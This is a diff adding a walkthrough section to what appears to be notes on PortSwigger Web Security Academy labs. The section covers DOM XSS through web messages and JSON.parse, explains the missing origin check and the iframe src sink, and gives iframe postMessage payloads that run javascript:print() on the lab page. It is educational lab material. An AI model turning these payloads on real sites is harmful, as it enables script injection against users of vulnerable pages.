@@ -46,3 +46,47 @@ To solve the lab you can host the below exploit on attacker's server.
 ```html
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 ```
+### 3. DOM XSS using web messages and JSON.parse
+**Objective**: This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.<br>
+Below is the snippet code we found in application home page while trying to view using View Page source.
+```html
+<script>
+  window.addEventListener('message', function(e) {
+    var iframe = document.createElement('iframe'),
+      ACMEplayer = {
+        element: iframe
+      },
+      d;
+    document.body.appendChild(iframe);
+    try {
+      d = JSON.parse(e.data);
+    } catch (e) {
+      return;
+    }
+    switch (d.type) {
+      case "page-load":
+        ACMEplayer.element.scrollIntoView();
+        break;
+      case "load-channel":
+        ACMEplayer.element.src = d.url;
+        break;
+      case "player-height-changed":
+        ACMEplayer.element.style.width = d.width + "px";
+        ACMEplayer.element.style.height = d.height + "px";
+        break;
+    }
+  }, false);
+```
+* The code sets up an event listener for message events. Any window (like an iframe, a popup, or an external site that opens this page) can use window.postMessage() to send data to this listener.
+* The code completely skips checking e.origin. Because there is no check, any website on the internet can embed this page in an iframe and send it a malicious message.
+* Sinks (Dangerous Assignments): The code takes data directly from the message payload (d.url) and assigns it straight to a dangerous JavaScript property (a "sink"):
+```html
+case "load-channel":
+  ACMEplayer.element.src = d.url; // <-- The Sink
+  break;
+```
+Howevever to trigger the XSS the data type should be load-channel. Lets craft the payload now.
+```html
+<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+```
+
